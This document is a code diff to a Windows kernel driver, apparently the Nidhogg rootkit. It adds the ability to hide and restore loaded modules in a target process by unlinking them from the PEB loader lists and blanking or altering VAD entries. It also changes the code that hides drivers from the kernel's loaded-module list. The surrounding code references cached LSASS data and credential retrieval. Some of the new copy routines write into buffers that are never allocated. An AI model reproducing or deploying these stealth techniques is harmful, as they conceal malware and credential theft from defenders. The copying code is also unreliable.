@@ -10,7 +10,7 @@ MemoryHandler::MemoryHandler() {
 	cachedLsassInfo.DesKey.Data = NULL;
 	cachedLsassInfo.Lock.Init();
 
-	if (!InitializeList(&hiddenDrivers))
+	if (!InitializeList(&hiddenDrivers) || !InitializeList(&hiddenModules))
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
 
 	__try {
@@ -23,10 +23,15 @@ MemoryHandler::MemoryHandler() {
 }
 
 MemoryHandler::~MemoryHandler() {
-	auto cleaner = [](_In_ HiddenDriverEntry* item) -> void {
+	auto driverCleaner = [](_In_ HiddenDriverEntry* item) -> void {
 		NidhoggMemoryHandler->UnhideDriver(item->DriverPath);
 	};
-	ClearList<HiddenDriversList, HiddenDriverEntry>(&hiddenDrivers, cleaner);
+
+	auto moduleCleaner = [](_In_ HiddenModuleEntry* item) -> void {
+		NidhoggMemoryHandler->RestoreModule(item);
+	};
+	ClearList<HiddenItemsList, HiddenDriverEntry>(&hiddenDrivers, driverCleaner);
+	ClearList<HiddenItemsList, HiddenModuleEntry>(&hiddenModules, moduleCleaner);
 
 	AutoLock lsassLock(this->cachedLsassInfo.Lock);
 	FreeVirtualMemory(this->cachedLsassInfo.DesKey.Data);
@@ -433,15 +438,8 @@ NTSTATUS MemoryHandler::HideModule(_In_ HiddenModuleInformation* moduleInformati
 	PEPROCESS targetProcess = NULL;
 	LARGE_INTEGER time = { 0 };
 	PVOID moduleBase = NULL;
-	WCHAR* moduleName = NULL;
+	HiddenModuleEntry entry = { 0 };
 	time.QuadPart = ONE_SECOND;
-
-	SIZE_T moduleNameSize = (wcslen(moduleInformation->ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
-	status = moduleNameAllocator.CopyData(moduleInformation->ModuleName, moduleNameSize);
-
-	if (!NT_SUCCESS(status))
-		return status;
 
 	// Getting the process's PEB.
 	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation->Pid), &targetProcess);
@@ -485,7 +483,13 @@ NTSTATUS MemoryHandler::HideModule(_In_ HiddenModuleInformation* moduleInformati
 
 		if (pebEntry) {
 			if (pebEntry->FullDllName.Length > 0) {
-				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation->ModuleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+					entry.ModuleName = moduleInformation->ModuleName;
+					entry.Pid = moduleInformation->Pid;
+					entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
+					entry.Links.InInitializationOrderLinks = pebEntry->InInitializationOrderLinks;
+					entry.Links.InMemoryOrderLinks = pebEntry->InMemoryOrderLinks;
+					entry.Links.HashLinks = pebEntry->HashLinks;
 					moduleBase = pebEntry->DllBase;
 					RemoveEntryList(&pebEntry->InLoadOrderLinks);
 					RemoveEntryList(&pebEntry->InInitializationOrderLinks);
@@ -500,8 +504,107 @@ NTSTATUS MemoryHandler::HideModule(_In_ HiddenModuleInformation* moduleInformati
 	KeUnstackDetachProcess(&state);
 
 	if (NT_SUCCESS(status))
-		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase));
+		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);
 
+	if (NT_SUCCESS(status))
+		AddHiddenModule(entry);
+	ObDereferenceObject(targetProcess);
+	return status;
+}
+
+/*
+* Description:
+* RestoreModule is responsible for restoring a hidden user mode module that is loaded in a process.
+* 
+* Parameters:
+* @moduleInformation [_In_ HiddenModuleInformation*] -- Required information, contains PID and module's name.
+* 
+* Returns:
+* @status			 [NTSTATUS]						 -- Whether successfuly restored or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleInformation* moduleInformation) {
+	HiddenModuleEntry* entry = nullptr;
+
+	__try {
+		entry = FindHiddenModule(moduleInformation);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
+	return RestoreModule(entry);
+}
+
+/*
+* Description:
+* RestoreModule is responsible for restoring a hidden user mode module that is loaded in a process.
+* 
+* Parameters:
+* @moduleEntry [_In_ HiddenModuleEntry*] -- Required information, contains the module's entry.
+* 
+* Returns:
+* @status	   [NTSTATUS]				 -- Whether successfuly restored or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
+	PLDR_DATA_TABLE_ENTRY pebEntry;
+	KAPC_STATE state;
+	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS targetProcess = NULL;
+	LARGE_INTEGER time = { 0 };
+	PVOID moduleBase = NULL;
+	WCHAR* moduleName = NULL;
+	time.QuadPart = ONE_SECOND;
+
+	if (!moduleEntry)
+		return STATUS_INVALID_PARAMETER;
+	status = PsLookupProcessByProcessId(ULongToHandle(moduleEntry->Pid), &targetProcess);
+
+	if (!NT_SUCCESS(status))
+		return status;
+	KeStackAttachProcess(targetProcess, &state);
+	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
+
+	if (!targetPeb) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED;
+	}
+
+	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
+		KeDelayExecutionThread(KernelMode, FALSE, &time);
+	}
+
+	if (!targetPeb->LoaderData) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+	pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+	if (pebEntry) {
+		InsertTailList(&pebEntry->InLoadOrderLinks, &moduleEntry->Links.InLoadOrderLinks);
+		InsertTailList(&pebEntry->InInitializationOrderLinks, &moduleEntry->Links.InInitializationOrderLinks);
+		InsertTailList(&pebEntry->InMemoryOrderLinks, &moduleEntry->Links.InMemoryOrderLinks);
+		InsertTailList(&pebEntry->HashLinks, &moduleEntry->Links.HashLinks);
+		status = STATUS_SUCCESS;
+	}
+	KeUnstackDetachProcess(&state);
+
+	if (NT_SUCCESS(status))
+		status = VadRestoreObject(targetProcess, moduleEntry->VadNode, moduleEntry->ModuleName);
+	FreeVirtualMemory(moduleEntry->ModuleName);
+
+	if (RemoveListEntry(&hiddenModules, moduleEntry))
+		status = STATUS_UNSUCCESSFUL;
 	ObDereferenceObject(targetProcess);
 	return status;
 }
@@ -522,6 +625,9 @@ NTSTATUS MemoryHandler::HideDriver(_In_ wchar_t* driverPath) {
 	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
 	NTSTATUS status = STATUS_NOT_FOUND;
 
+	if (!IsValidPath(driverPath))
+		return STATUS_INVALID_PARAMETER;
+
 	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
 		return STATUS_ABANDONED;
 
@@ -533,26 +639,16 @@ NTSTATUS MemoryHandler::HideDriver(_In_ wchar_t* driverPath) {
 
 		if (_wcsnicmp(loadedModulesEntry->FullDllName.Buffer, driverPath,
 			loadedModulesEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-
-			// Copying the original entry to make sure it can be restored again.
-			hiddenDriver.DriverPath = AllocateMemory<wchar_t*>((loadedModulesEntry->FullDllName.Length + sizeof(wchar_t)) * sizeof(wchar_t));
-
-			if (!hiddenDriver.DriverPath) {
-				status = STATUS_INSUFFICIENT_RESOURCES;
-				break;
-			}
 			errno_t err = wcscpy_s(hiddenDriver.DriverPath, (loadedModulesEntry->FullDllName.Length + sizeof(wchar_t)) * sizeof(wchar_t), 
 				loadedModulesEntry->FullDllName.Buffer);
 
 			if (err != 0) {
-				FreeVirtualMemory(hiddenDriver.DriverPath);
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-			hiddenDriver.originalEntry = loadedModulesEntry;
+			hiddenDriver.OriginalEntry = loadedModulesEntry;
 
 			if (!AddHiddenDriver(hiddenDriver)) {
-				FreeVirtualMemory(hiddenDriver.DriverPath);
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -591,7 +687,7 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 
 	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
 	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->originalEntry));
+	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->OriginalEntry));
 
 	if (RemoveListEntry(&hiddenDrivers, driverEntry))
 		status = STATUS_UNSUCCESSFUL;
@@ -901,22 +997,75 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentials* credentials) {
 
 /*
 * Description:
+* VadRestoreObject is responsible for restoring a specific node inside a VAD tree.
+* 
+* Parameters:
+* @process			[_Inout_ PEPROCESS]		-- Target to process to search on its VAD.
+* @vadNode			[_In_ PMMVAD_SHORT]		-- The VAD node to restore.
+* @moduleName		[_In_opt_ wchar_t*]		-- The module name to restore, required if the node is an image map.
+* @vadProtection	[_In_opt_ ULONG]		-- The protection to restore, required if the node is a physical memory map.
+* 
+* Returns:
+* @status			[NTSTATUS]				-- STATUS_SUCCESS is restored else error.
+*/
+_IRQL_requires_max_(DISPATCH_LEVEL)
+NTSTATUS MemoryHandler::VadRestoreObject(_Inout_ PEPROCESS process, _In_ PMMVAD_SHORT vadNode, _In_opt_ wchar_t* moduleName,
+	_In_opt_ ULONG vadProtection) {
+	NTSTATUS status = STATUS_INVALID_PARAMETER;
+
+	if (!process || !vadNode || (!moduleName && vadProtection == NO_ACCESS))
+		return status;
+
+	if (vadNode->u.VadFlags.VadType == VadImageMap) {
+		if (!moduleName)
+			return STATUS_INVALID_PARAMETER;
+		PMMVAD longNode = reinterpret_cast<PMMVAD>(vadNode);
+
+		if (!longNode->Subsection)
+			return STATUS_INVALID_ADDRESS;
+
+		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
+			return STATUS_INVALID_ADDRESS;
+
+		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
+		errno_t err = wcscpy_s(fileObject->FileName.Buffer, fileObject->FileName.MaximumLength * sizeof(wchar_t), moduleName);
+
+		if (err != 0)
+			return STATUS_UNSUCCESSFUL;
+
+		status = STATUS_SUCCESS;
+	}
+	else if (vadNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
+		if (vadProtection == NO_ACCESS)
+			return STATUS_INVALID_PARAMETER;
+		vadNode->u.VadFlags.Protection = vadProtection;
+		status = STATUS_SUCCESS;
+	}
+	return status;
+}
+
+/*
+* Description:
 * VadHideObject is responsible for hiding a specific node inside a VAD tree.
 *
 * Parameters:
-* @process			 [_Inout_ PEPROCESS] -- Target to process to search on its VAD.
-* @targetAddress	 [_In_ ULONG_PTR]	 -- Virtual address of the module to hide.
+* @process			 [_Inout_ PEPROCESS]		  -- Target to process to search on its VAD.
+* @targetAddress	 [_In_ ULONG_PTR]			  -- Virtual address of the module to hide.
+* @moduleEntry		 [_Inout_ HiddenModuleEntry&] -- The module entry to fill in order to restore it later.
 *
 * Returns:
 * @status			 [NTSTATUS]			 -- STATUS_SUCCESS is hidden else error.
 */
-_IRQL_requires_max_(DISPATCH_LEVEL)
-NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress) {
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress, _Inout_ HiddenModuleEntry& moduleEntry) {
 	PRTL_BALANCED_NODE node = NULL;
 	PMMVAD_SHORT shortNode = NULL;
 	PMMVAD longNode = NULL;
 	NTSTATUS status = STATUS_INVALID_PARAMETER;
 	ULONG_PTR targetAddressStart = targetAddress >> PAGE_SHIFT;
+
+	if (!process || targetAddress == 0)
+		return status;
 
 	// Finding the VAD node associated with the target address.
 	ULONG vadRootOffset = GetVadRootOffset();
@@ -933,6 +1082,7 @@ NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR 
 		return STATUS_NOT_FOUND;
 
 	shortNode = reinterpret_cast<PMMVAD_SHORT>(node);
+	moduleEntry.VadNode = shortNode;
 
 	// Hiding the image name or marking the area as no access.
 	if (shortNode->u.VadFlags.VadType == VadImageMap) {
@@ -946,12 +1096,23 @@ NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR 
 
 		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
 
-		if (fileObject->FileName.Length > 0)
-			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
+		if (fileObject->FileName.Length > 0) {
+			moduleEntry.ModuleName = AllocateMemory<WCHAR*>(fileObject->FileName.MaximumLength + sizeof(wchar_t));
 
+			if (!moduleEntry.ModuleName)
+				return STATUS_INSUFFICIENT_RESOURCES;
+			errno_t err = wcscpy_s(moduleEntry.ModuleName, fileObject->FileName.Length + sizeof(wchar_t), fileObject->FileName.Buffer);
+
+			if (err != 0) {
+				FreeVirtualMemory(moduleEntry.ModuleName);
+				return STATUS_UNSUCCESSFUL;
+			}
+			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
+		}
 		status = STATUS_SUCCESS;
 	}
 	else if (shortNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
+		moduleEntry.OriginalVadProtection = shortNode->u.VadFlags.Protection;
 		shortNode->u.VadFlags.Protection = NO_ACCESS;
 		status = STATUS_SUCCESS;
 	}
@@ -1129,6 +1290,25 @@ PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
 }
 
 /*
+*/
+_IRQL_requires_max_(APC_LEVEL)
+HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleInformation* info) const {
+	if (!info->ModuleName || !IsValidPath(info->ModuleName) || info->Pid <= SYSTEM_PROCESS_PID)
+		ExRaiseStatus(STATUS_INVALID_PARAMETER);
+
+	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ HiddenModuleInformation* infoToSearch) {
+		if (wcslen(item->ModuleName) != wcslen(infoToSearch->ModuleName) || item->Pid != infoToSearch->Pid)
+			return false;
+		return _wcsicmp(item->ModuleName, infoToSearch->ModuleName) == 0;
+	};
+	HiddenModuleEntry* item = FindListEntry<HiddenItemsList, HiddenModuleEntry, HiddenModuleInformation*>(hiddenModules, info, finder);
+
+	if (!item)
+		ExRaiseStatus(STATUS_NOT_FOUND);
+	return item;
+}
+
+/*
 * Description:
 * FindHiddenDriver is responsible for searching if an item exists in the list of hidden drivers.
 *
@@ -1146,7 +1326,7 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 	auto finder = [](_In_ const HiddenDriverEntry* item, _In_ wchar_t* driverPath) {
 		return _wcsicmp(item->DriverPath, driverPath) == 0;
 	};
-	HiddenDriverEntry* item = FindListEntry<HiddenDriversList, HiddenDriverEntry, wchar_t*>(hiddenDrivers, driverPath, finder);
+	HiddenDriverEntry* item = FindListEntry<HiddenItemsList, HiddenDriverEntry, wchar_t*>(hiddenDrivers, driverPath, finder);
 
 	if (!item)
 		return false;
@@ -1158,13 +1338,61 @@ bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenD
 
 /*
 * Description:
+* AddHiddenModule is responsible for adding an item to the list of hidden modules.
+* 
+* Parameters:
+* @item	  [_Inout_ HiddenModuleEntry&] -- Module to add.
+* 
+* Returns:
+* @bool								   -- Whether successfully added or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
+	HiddenModuleEntry* entry = nullptr;
+	if (!IsValidPath(item.ModuleName) || item.Pid <= SYSTEM_PROCESS_PID)
+		return false;
+
+	__try {
+		entry = FindHiddenModule(reinterpret_cast<HiddenModuleInformation*>(&item));
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		if (GetExceptionCode() != STATUS_NOT_FOUND)
+			return false;
+	}
+
+	if (entry)
+		return false;
+	entry = AllocateMemory<HiddenModuleEntry*>(sizeof(HiddenModuleEntry));
+
+	if (!entry)
+		return false;
+	entry->Pid = item.Pid;
+	entry->OriginalVadProtection = item.OriginalVadProtection;
+	entry->VadNode = item.VadNode;
+	entry->Links.HashLinks = item.Links.HashLinks;
+	entry->Links.InInitializationOrderLinks = item.Links.InInitializationOrderLinks;
+	entry->Links.InLoadOrderLinks = item.Links.InLoadOrderLinks;
+	entry->Links.InMemoryOrderLinks = item.Links.InMemoryOrderLinks;
+
+	errno_t err = wcscpy_s(entry->ModuleName, (wcslen(item.ModuleName) + 1) * sizeof(wchar_t), item.ModuleName);
+
+	if (err != 0) {
+		FreeVirtualMemory(entry);
+		return false;
+	}
+	AddEntry(&this->hiddenModules, entry);
+	return true;
+}
+
+/*
+* Description:
 * AddHiddenDriver is responsible for adding an item to the list of hidden drivers.
 *
 * Parameters:
 * @item	  [_Inout_ HiddenDriverItem&] -- Driver to add.
 *
 * Returns:
-* @status [bool]					  -- Whether successfully added or not.
+* @bool								  -- Whether successfully added or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
 bool MemoryHandler::AddHiddenDriver(_Inout_ HiddenDriverEntry& item) {
@@ -1173,7 +1401,18 @@ bool MemoryHandler::AddHiddenDriver(_Inout_ HiddenDriverEntry& item) {
 
 	if (FindHiddenDriver(item.DriverPath, nullptr))
 		return false;
-	AddEntry(&this->hiddenDrivers, &item);
+	HiddenDriverEntry* driverEntry = AllocateMemory<HiddenDriverEntry*>(sizeof(HiddenDriverEntry));
+
+	if (!driverEntry)
+		return false;
+	driverEntry->OriginalEntry = item.OriginalEntry;
+	errno_t err = wcscpy_s(driverEntry->DriverPath, (wcslen(item.DriverPath) + 1) * sizeof(wchar_t), item.DriverPath);
+
+	if (err != 0) {
+		FreeVirtualMemory(driverEntry);
+		return false;
+	}
+	AddEntry(&this->hiddenDrivers, driverEntry);
 	return true;
 }
 
